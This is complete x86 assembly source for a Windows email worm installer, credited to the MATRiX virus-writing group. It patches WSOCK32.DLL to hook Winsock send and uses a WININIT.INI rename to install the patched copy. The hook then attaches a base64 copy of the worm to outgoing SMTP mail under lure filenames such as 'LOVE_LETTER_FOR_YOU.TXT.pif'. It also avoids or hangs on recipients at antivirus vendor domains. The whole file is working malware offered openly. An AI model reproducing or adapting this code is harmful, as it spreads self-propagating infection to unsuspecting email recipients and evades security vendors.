
; this is the email worm installer.

     .586p
     .model flat
     locals
     jumps

     ; KERNEL32.DLL

     extrn GetProcAddress:proc
     extrn GetModuleHandleA:proc
     extrn ExitProcess:proc

     .code

start:

     push offset ker
     call GetModuleHandleA

     mov ebp,eax
     mov edi,offset addr
     mov esi,offset cop

start0003:

     push esi
     push ebp
     call GetProcAddress

     test eax,eax
     jz goout
     stosd

start0001:

     lodsb
     cmp al,0
     jne start0001
     lodsb
     cmp al,0ffh
     je start0002
     dec esi
     jmp start0003

start0002:

     xor ebp,ebp
     push 260
     mov edi,offset buffer001
     push edi
     call GetSystemDirectoryA

     test eax,eax
     jz goout

     add edi,eax
     mov eax,'OSW\'
     stosd
     mov eax,'23KC'
     stosd
     mov eax,'LLD.'
     stosd
     xor eax,eax
     stosd

     push offset buffer001
     push offset buffer002
     call lstrcat

     mov esi,offset buffer002
     push esi
     call lstrlen

     add esi,eax
     sub esi,4
     mov [esi],'XTM.'

     push 0
     push offset buffer002
     push offset buffer001
     call CopyFileA

     push 0 0 3 0 1
     push 80000000h or 40000000h
     push offset buffer002
     call CreateFileA

     test eax,eax
     jz goout

     push eax 0 eax
     call GetFileSize

     mov [filesize],eax
     test eax,eax
     jz goout

     call CloseHandle

     mov eax,offset buffer002
     call open

     test eax,eax
     jz goout

     call processit1

     test eax,eax
     jnz goout

     call unmap

     call wininit

goout:

jmp goout2

   call [handle]
   call [handle]
   call [handle]
   call [handle]
   call [handle]
   call [handle]
   call [handle]
   call [handle]
   call [handle]
   call [handle]
   call [handle]
   call [handle]

goout2:

     call [goout3]

     push 0
     call ExitProcess

goout3 dd offset goout4

goout4:

nop
ret

processit1:

     pushad
     mov esi,eax
     cmp byte ptr [esi+18],'@'
     jne processit2

     call unmap

     push offset buffer002
     call DeleteFileA

     mov dword ptr [esp+(4*7)],-1
     popad
     ret

processit2:

     xor eax,eax
     mov byte ptr [esi+18],'@'
     mov edi,[esi+60]
     mov [ntpe],edi
     add esi,edi     
     movzx eax,word ptr [esi+6]
     mov [secnum],eax
     mov ebx,[esi+52]
     mov [base],ebx
     dec ax
     mov ecx,40
     mul ecx
     mov [sectxx],eax
     not [sectxx]
     mov ebx,[esi+74h]
     shl ebx,3
     add eax,ebx
     add eax,78h
     add eax,edi
     add [sectxx],eax
     add eax,[mem_addr]
     mov ebx,[eax+8]
     push ebx
     mov ecx,ebx
     add ecx, trojan002 - trojan001
     call mem
     mov [eax+8],ebx
     mov ebx,[eax+16]
     mov ecx,ebx
     add ecx, trojan002 - trojan001
     call mem
     mov [eax+16],ebx
     mov edi,[eax+20]
     add edi,[esp]
     or [eax+36],0C0000000H
     push dword ptr [eax+12]

     add [filesize], trojan002 - trojan001
     call unmap
     mov eax,offset buffer002
     call open

     pop eax
     pop ebx
     add eax,ebx    ;    RVA
     mov [rva],eax
     add edi,[mem_addr]
     mov [raw],edi
     call processit3
     mov edi,12345678h
     org $-4
     raw dd 0
     mov esi,offset trojan001
     mov ecx, trojan002 - trojan001
     rep movsb
     mov dword ptr [esp+(4*7)],0
     popad
     ret

processit3:

     mov esi,[mem_addr]
     mov eax,12345678h
     org $-4
     ntpe dd 0
     add eax,120
     mov eax,[eax+esi]
     call convert
     add eax,28 ;    point it
     mov eax,[eax+esi] ;    get offset
     call convert
     mov ebx,12345678h
     org $-4
     rva dd 0
     xchg [eax+esi+(4*18)],ebx ;   Vecna rules ;)
     add ebx,12345678h
     org $-4
     base dd 0
     mov [send],ebx ;    save send
     ret
mem:

     lea ebx,[ebx*2]
     cmp ebx,ecx
     jbe mem
     ret

convert:

     pushad
     mov ecx,12345678h
     org $-4
     secnum dd 0
     mov esi,12345678h
     org $-4
     sectxx dd 0 ;  inicio das secoes
     add esi,[mem_addr]
     inc esi

convxxx:

     mov ebx,eax
     sub ebx,[esi+12]
     cmp [esi+8],ebx
     jae conved
     add esi,40
     loop convxxx
     xor ebx,ebx
     jmp conved+3

conved:

     add ebx,[esi+20]
     mov [esp+(4*7)],ebx
     popad
     ret

wininit:

     push 260
     mov edi,offset buffer003
     push edi
     call GetWindowsDirectoryA
     add edi,eax

     mov eax,'NIW\'
     stosd
     mov eax,'TINI'
     stosd
     mov eax,'INI.'
     stosd
     xor eax,eax
     stosd

     push 260
     pop [filesize]
     mov eax,offset buffer003
     call create

     test eax,eax
     jz goout
     mov edi,eax

     mov ecx,10
     call __rename
     db '[Rename]',0dh,0ah

__rename:

     pop esi
     rep movsb

     mov eax,'=LUN'
     stosd

     mov esi,offset buffer001
     push esi
     call lstrlen

     mov ecx,eax
     push eax
     rep movsb
     mov ax,0a0dh
     stosw

     mov ecx,[esp]
     mov esi,offset buffer001
     rep movsb

     mov al,'='
     stosb

     pop ecx
     mov esi,offset buffer002
     rep movsb

     mov ax,0a0dh
     stosw

     sub edi,[mem_addr]
     push edi
     pop [filesize]
     call unmap
     ret

trojan001:

     pushf
     pushad
     call delta
delta:
     pop ebp
     sub ebp,offset delta
     mov eax,[esp+(4*1)+(4*8)+(4*2)]
     mov ecx,[esp+(4*1)+(4*8)+(4*1)]
     jecxz tro0001
     cmp [eax],'LIAM'
     je tromail
     cmp [eax],'TPCR'
     je trorcpt
     cmp [eax],'TIUQ'
     je troquit
     cmp [eax],' TEG'
     je troget
     cmp [eax],'ATAD'
     jne tro0001
     mov [ebp+X001],ecx
     jmp tro0001

X001 dd 0

tromail:

     mov esi,eax
     cmp [eax+5],'MORF'
     jne tro0001
     call bife__
     db 100 dup (0)
bife__:
     pop edi
__bife:
     lodsb
     stosb
     cmp al,'>'
     je _bife
     loop __bife
_bife:
     mov eax,00000a0dh
     stosd
     jmp tro0001

trorcpt:

     mov esi,eax
     cmp word ptr [eax+5],'OT'
     jne tro0001

     ; -*-*-*-*-*-*-*-*-*-*-*-
     call av0001
     ; -*-*-*-*-*-*-*-*-*-*-*-

     call mosca__
     db 100 dup (0)
mosca__:
     pop edi
__mosca:
     lodsb
     stosb
     cmp al,'>'
     je _mosca
     loop __mosca
_mosca:
     mov eax,00000a0dh
     stosd
     jmp tro0001

     ; -*-*-*-*-*-*-*-*-*-*-*-
troget:
     lea edi,[ebp+entry0001]
     mov edx,ecx
     mov ecx,(offset av0004 - offset entry0001)/4
     mov esi,eax
av0012:
     mov eax,[edi]
     call av0010
     add edi,4
     loop av0012
troget__:
     jmp tro0001

av0010:
     pushad
     mov ecx,edx
av0011:
     cmp [esi],eax
     je av0006
     inc esi
     loop av0011
     popad
     ret
     ; -*-*-*-*-*-*-*-*-*-*-*-

troquit:

     ; time to send email

     cmp [ebp+X001],ecx
     jne tro0001

     ; send fields

     lea esi,[ebp+(offset bife__ - 100)]
     cmp dword ptr [esi],0
     je tronull
     push esi
     call [ebp+lstrlen]

     mov ecx, eax
     mov eax, esi
     call send_file

     lea esi,[ebp+(offset mosca__ - 100)]
     cmp dword ptr [esi],0
     je tronull
     push esi
     call [ebp+lstrlen]

     mov ecx, eax
     mov eax, esi
     call send_file

     ; data

     call data__
     db 'DATA',0dh,0ah
data__:
     pop eax
     mov ecx, 6
     call send_file

     ; send header

     call from00
     db 'From: '
from00:
     pop eax
     mov ecx, 6
     call send_file

     lea esi, [ebp+(offset bife__ - 90)]
     push esi
     call [ebp+lstrlen]
     mov ecx, eax
     mov eax, esi
     call send_file

     mov ecx, (offset mime001a - offset mime001)
     lea eax, [ebp+ offset mime001]
     call send_file

     call send_name

     mov ecx, (offset mime001b - offset mime001a)
     lea eax, [ebp+ offset mime001a]
     call send_file

     call send_name

     mov ecx, (offset mime002 - offset mime001b)
     lea eax, [ebp+ offset mime001b]
     call send_file

     call openwin32

     test eax,eax
     jz tronull

     call virtualbase64

     ; retorna tamanho em ecx

     test eax,eax
     jnz tronullmap

     ; send the file in base64 format

    mov eax, dword ptr [ebp+X004]
    call send_file

    mov ecx, (offset mime003 - offset mime002)
    lea eax, [ebp+mime002]
    call send_file

tronullmap:

     call unmap

tronull:

     xor eax, eax
     mov dword ptr [ebp+X001], eax
     mov dword ptr [ebp+(offset mosca__ - 100)], eax
     mov dword ptr [ebp+(offset bife__ - 100)], eax
     mov dword ptr [ebp+X004], eax
     mov dword ptr [ebp+X005], eax
     mov dword ptr [ebp+szffile], eax

tro0001:

     mov [esp+(4*7)],12345678h
     org $-4
     send dd 0
     popad
     popf
     jmp eax

virtualbase64:

     push 40h
     push 103000h
     push dword ptr [ebp+X002]
     push 0
     call [ebp+VirtualAlloc]
     mov [ebp+X004],eax

     test eax,eax
     jz virtuafail

     mov edi,eax
     mov eax,[ebp+filesize]
     mov esi,[ebp+mem_addr]

     ; (c)Vecna routine

     call BASE64

     xor eax,eax
     ret

virtuafail:

     dec eax
     ret

create:

     push 0
     push 0
     push 2
     jmp open_

open:

     push 0
     push 0
     push 3

open_:

     push 0
     push 1
     push 80000000h or 40000000h
     push eax
     call [ebp+CreateFileA]

     mov [ebp+handle1],eax
     inc eax
     jz ebc
     dec eax

     ; Save info. about the file

     call @@time
     time dd 0,0,0,0,0,0

@@time:

     mov eax,[esp]
     add eax,8
     push eax
     add eax,8
     push eax
     push [ebp+handle1]
     call [ebp+GetFileTime]

     push 0
     push [ebp+filesize]
     push 0
     push 4
     push 0
     push [ebp+handle1]
     call [ebp+CreateFileMappingA]

     mov [ebp+handle2],eax
     test eax,eax
     jz eac

     push [ebp+filesize]
     push 0
     push 0
     push 2
     push [ebp+handle2]
     call [ebp+MapViewOfFile]

     ; Return address in eax

     mov [ebp+mem_addr],eax 
     test eax,eax
     jz cbm
     ret

unmap:

     push [ebp+mem_addr]
     call [ebp+UnmapViewOfFile]
cbm:

     push [ebp+handle2]
     call [ebp+CloseHandle]

     push 0
     push 0
     push [ebp+filesize]
     push [ebp+handle1]
     call [ebp+SetFilePointer]

     push [ebp+handle1]
     call [ebp+SetEndOfFile]

eac:

     lea eax,[ebp+time]
     push eax
     add eax,8
     push eax
     add eax,8
     push eax
     push [ebp+handle1]
     call [ebp+SetFileTime]

     push [ebp+handle1]
     call [ebp+CloseHandle]

ebc:

     xor eax,eax
     ret

addr:

     CopyFileA dd 0
     DeleteFileA dd 0
     lstrlen dd 0
     lstrcat dd 0
     GetSystemDirectoryA dd 0
     GetWindowsDirectoryA dd 0
     GetFileSize dd 0
     CloseHandle dd 0
     CreateFileA dd 0
     GetFileTime dd 0
     CreateFileMappingA dd 0
     MapViewOfFile dd 0
     UnmapViewOfFile dd 0
     SetFilePointer dd 0
     SetEndOfFile dd 0
     SetFileTime dd 0
     VirtualAlloc dd 0
     VirtualFree dd 0
     GetSystemTime dd 0

     mem_addr  dd 0
     handle dd 0
     handle1 dd 0
     handle2 dd 0
     filesize  dd 0

BASE64:

     cld
     push edi
     push 3
     call transmc

transx:

     db 'A','B','C','D','E','F','G','H','I','J'
     db 'K','L','M','N','O','P','Q','R','S','T'
     db 'U','V','W','X','Y','Z','a','b','c','d'
     db 'e','f','g','h','i','j','k','l','m','n'
     db 'o','p','q','r','s','t','u','v','w','x'
     db 'y','z','0','1','2','3','4','5','6','7'
     db '8','9','+','/'
chars dd ?            ;contador de caracteres

transmc:

     pop ebx
     pop ecx
     cdq
     mov dword ptr [ebx+ecx+((offset chars-offset transx)-3)], edx  ;tricky ;)
     div ecx
     mov ecx, eax
     push edx

   @@loop:

     lodsd
     dec esi          ;edx=original
     mov edx, eax     ;edx=work copy
     call temp
     call CODE64Block3
     call CODE64Block4
     loop @@loop
     pop ecx          ;get rest
     jecxz @@done
     lodsd
     dec ecx
     jz @@rest1
     movzx edx, ax    ;use only 2 bytes
     call temp
     call CODE64Block3
     jmp @@end

   @@rest1:

     movzx edx, al    ;use 1 byte only
     call temp
     inc ecx
     inc ecx

   @@end:

     mov al, '='
     rep stosb

   @@done:

     mov eax, 0A0D0A0Dh
     stosd
     pop ecx
     sub edi, ecx     ;edi=buffer
     xchg ecx, edi    ;ecx=size
     ret

temp:

     call CODE64Block1            ;little optimizing routine
     call CODE64Block2
     ret

CODE64Block1:

     mov eax, edx
     shr eax, 02h

  process3:

     jmp process

CODE64Block2:

     mov eax, edx
     shl al, 04h
     shr ah, 04h

  process2:

     or al, ah        ;chained jmps
     jmp process3     ;another "why make it easy?" (c) Vecna ;)

CODE64Block3:

     mov eax, edx
     shr eax, 08h
     shl al, 02h
     shr ah, 06h
     jmp process2

CODE64Block4:

     mov eax,edx
     shr eax,10h

  process:

     and al,00111111b
     xlatb
     stosb
     mov eax, dword ptr [ebx+(offset chars-offset transx)]
     inc eax
     mov dword ptr [ebx+(offset chars-offset transx)], eax
     pushad
     push 0000004Ch
     pop ecx
     cdq
     div ecx
     test edx, edx
     popad
     jnz @@noline
     mov ax, 0A0Dh
     stosw

   @@noline:

     ret

openwin32:

     push 260
     lea edi,[ebp+X003]
     push edi
     call [ebp+GetWindowsDirectoryA]

     add edi,eax
     mov eax,'NIW\'
     stosd
     mov eax,'D.23'
     stosd
     mov eax,'LL'
     stosd

     lea eax,[ebp+X003]

getsize:

     push 0
     push 0
     push 3
     push 0
     push 1
     push 80000000h or 40000000h
     push eax
     call [ebp+CreateFileA]

     mov ebx, eax
     inc eax
     jz getsize33

     push ebx 0 ebx
     call [ebp+GetFileSize]

     mov [ebp+filesize],eax
     lea eax,[eax*4]
     mov [ebp+X002],eax

     call [ebp+CloseHandle]

     mov eax,[ebp+filesize]
     test eax, eax
     jnz w32cont

getsize33:

     ret

w32cont:

     lea eax,[ebp+X003]

     call open
     ret

av0001:

     ; entry: esi

     pushad
     mov ecx,100

av0003:

     lodsb
     cmp al,'@'
     je av0002
     loop av0003
     popad
     ret

av0002:

     mov edx,esi
     lodsd
     mov ecx,6
     call av0004

entry0001:

     db 'NAI.' ; NAI
     db 'nai.'
     db 'avp.' ; AVP [ I respect you ! ]
     db 'AVP.'
     db 'F-Se' ; F-Secure
     db 'f-se'
     db 'mapl' ; maple
     db 'pand' ; panda
     db 'soph' ; sophos
     db 'ndmi' ; trendmicro
     db 'afee' ; mcafee [ Why put this shit here ? ] :)
     db 'yenn' ; cheyenne
     db 'lywa' ; uglyware [ Some1 knows you ? ]
     db 'tbav' ; tbav
     db 'yman' ; symantec [ Most used at Brazil, i think ]

av0004:

     pop ebx

av0005:

     cmp eax,[ebx]
     je av0006
     add ebx,4
     loop av0005

     call av0007

av0007a:

     ; many sites above are from AV(s)
     ; or just AV - related

     db 'wildlist.o'     ; wildlist
     db 'il.esafe.c'     ; 
     db 'perfectsup'     ; perfectsuporte
     db 'complex.is'
     db 'HiServ.com'
     db 'hiserv.com'
     db 'metro.ch>',0dh
     db 'beyond.com'
     db 'mcafee.com'     ; mcafee
     db 'pandasoftw'     ; pandasoftware
     db 'earthlink.'
     db 'inexar.com'
     db 'comkom.co.'
     db 'meditrade.'
     db 'mabex.com>'
     db 'cellco.com'
     db 'symantec.c'     ; symantec
     db 'successful'     ; sucessfull ( AV related )
     db 'inforamp.n'
     db 'newell.com'
     db 'singnet.co'
     db 'bmcd.com.a'
     db 'bca.com.nz'     ; 
     db 'trendmicro'     ; trendmicro
     db 'sophos.com'     ; sophos
     db 'maple.com.'     ; maple
     db 'netsales.n'     ; netsales ( AV related )
     db 'f-secure.c'     ; f-secure
     db 'F-Secure.c'     ; f-secure

av0007:

     pop eax
     mov ecx,((offset av0007 - offset av0007a) /10)

av0008:

     push ecx
     mov ecx,10
     mov esi,eax
     mov edi,edx
     rep cmpsb
     jz av0006
     add eax,10
     pop ecx
     loop av0008
     popad
     ret

av0006:

     call $

X002 dd 0
X003 dd 65 dup(0)
X004 dd 0
X005 dd 0
;mbox dd 0BFF5412Eh
;recv dd 078661692h
szffile dd 0

mime001 label
     db 'MIME-Version: 1.0',0dh,0ah,'Content-Type: '
     db 'multipart/mixed; boundary="==i3.9.0oisdboibsd((kncd"'
     dd 0a0d0a0dh
     db '--==i3.9.0oisdboibsd((kncd',0dh,0ah
     db 'Content-Type: application/octet-stream; name="'
mime001a label
     db '"',0dh,0ah
     db 'Content-Transfer-Encoding: base64',0dh,0ah
     db 'Content-Disposition: attachment; filename="'
mime001b label
     db '"'
     dd 0a0d0a0dh
mime002 label
     db 0dh,0ah
     db '--==i3.9.0oisdboibsd((kncd--',0dh,0ah
     db 0dh,0ah,2eh,0dh,0ah
mime003 label

send_file:

     pushad

     mov dword ptr [ebp+szffile], ecx
     mov dword ptr [ebp+X005], eax
     cmp ecx, 4096
     jbe send_fileff

send_fileffd:

     call send_4k

send_ic:

    test eax, eax
    jz send_ret
    cmp eax,-1
    je send_ret

    sub dword ptr [ebp+szffile], eax
    add dword ptr [ebp+X005], eax
    jmp short send_ret

send_fileff:

     push 0
     push [ebp+szffile] ;ecx
     push [ebp+X005]
     push [ebp+X001]
     call [ebp+send]
     jmp short send_ic

send_ret:

    cmp [ebp+szffile], 4096
    jae send_fileffd
    cmp [ebp+szffile], 0
    ja send_fileff
    popad
    ret

send_4k:

    push 0
    push 4096
    push [ebp+X005]
    push [ebp+X001]
    call [ebp+send]
    ret

send_name:

pushad

lea eax,[ebp+systemtime]
push eax
call [ebp+GetSystemTime]

xor eax, eax
mov ax, word ptr [ebp+systemtime+6]
lea eax, [eax*4]
lea esi, [ebp+biglist]
mov esi, dword ptr [esi+eax]
add esi, ebp

push esi
call [ebp+lstrlen]

mov ecx, eax
mov eax, esi
call send_file

popad
ret

biglist:

dd offset big0
dd offset big1
dd offset big2
dd offset big3
dd offset big4
dd offset big5
dd offset big6
dd offset big7
dd offset big8
dd offset big9
dd offset big10
dd offset big11
dd offset big12
dd offset big13
dd offset big14
dd offset big15
dd offset big16
dd offset big17
dd offset big18
dd offset big19
dd offset big20
dd offset big21
dd offset big22
dd offset big23
dd offset big24
dd offset big25
dd offset big26
dd offset big27
dd offset big28
dd offset big29
dd offset big30
dd offset big31

big0 db 'README.TXT.pif',0
big1 db 'I_wanna_see_YOU.TXT.pif',0
big2 db 'MATRiX_Screen_Saver.SCR',0
big3 db 'LOVE_LETTER_FOR_YOU.TXT.pif',0
big4 db 'NEW_playboy_Screen_saver.SCR',0
big5 db 'BILL_GATES_PIECE.JPG.pif',0
big6 db 'TIAZINHA.JPG.pif',0
big7 db 'FEITICEIRA_NUA.JPG.pif',0
big8 db 'Geocities_Free_sites.TXT.pif',0
big9 db 'NEW_NAPSTER_site.TXT.pif',0
big10 db 'METALLICA_SONG.MP3.pif',0
big11 db 'ANTI_CIH.EXE',0
big12 db 'INTERNET_SECURITY_FORUM.DOC.pif',0
big13 db 'FREE_yahoo-email.DOC.pif',0
big14 db 'READER_DIGEST_LETTER.TXT.pif',0
big15 db 'WIN_$100_NOW.DOC.pif',0
big16 db 'IS_LINUX_GOOD_ENOUGH!.TXT.pif',0
big17 db 'QI_TEST.EXE',0
big18 db 'AVP_Updates.EXE',0
big19 db 'SEICHO-NO-IE.EXE',0
big20 db 'YOU_are_FAT!.TXT.pif',0
big21 db 'FREE_xxx_sites.TXT.pif',0
big22 db 'I_am_sorry.DOC.pif',0
big23 db 'I_nude.AVI.pif',0
big24 db 'Sorry_about_yesterday.DOC.pif',0
big25 db 'Protect_your_credit.HTML.pif',0
big26 db 'JIMI_HMNDRIX.MP3.pif',0
big27 db 'HANSON.SCR',0
big28 db 'FUCKING_WITH_DOGS.SCR',0
big29 db 'MATRiX_2_is_OUT.SCR',0
big30 db 'zipped_files.EXE',0
big31 db 'BLINK_182.MP3.pif',0

systemtime dd 0,0,0,0

copyright db 'Software provide by [MATRiX] VX team:',0dh,0ah
          db 'Ultras, Mort, Nbk, Tgr, Del_Armg0, Anaktos',0dh,0ah
          db 'Greetz:',0d,0ah
          db 'All VX guy on #virus channel and Vecna',0dh,0ah
          db 'Visit us: www.coderz.net/matrix',0

trojan002:

.data?

     buffer001 db 260 dup (0)
     buffer002 db 260 dup (0)
     buffer003 db 260 dup (0)

.data

ker  db 'KERNEL32.DLL',0
cop  db 'CopyFileA',0
     db 'DeleteFileA',0
     db 'lstrlen',0
     db 'lstrcat',0
     db 'GetSystemDirectoryA',0
     db 'GetWindowsDirectoryA',0
     db 'GetFileSize',0
     db 'CloseHandle',0
     db 'CreateFileA',0
     db 'GetFileTime',0
     db 'CreateFileMappingA',0
     db 'MapViewOfFile',0
     db 'UnmapViewOfFile',0
     db 'SetFilePointer',0
     db 'SetEndOfFile',0
     db 'SetFileTime',0
     db 'VirtualAlloc',0
     db 'VirtualFree',0
     db 'GetSystemTime',0,0ffh

end start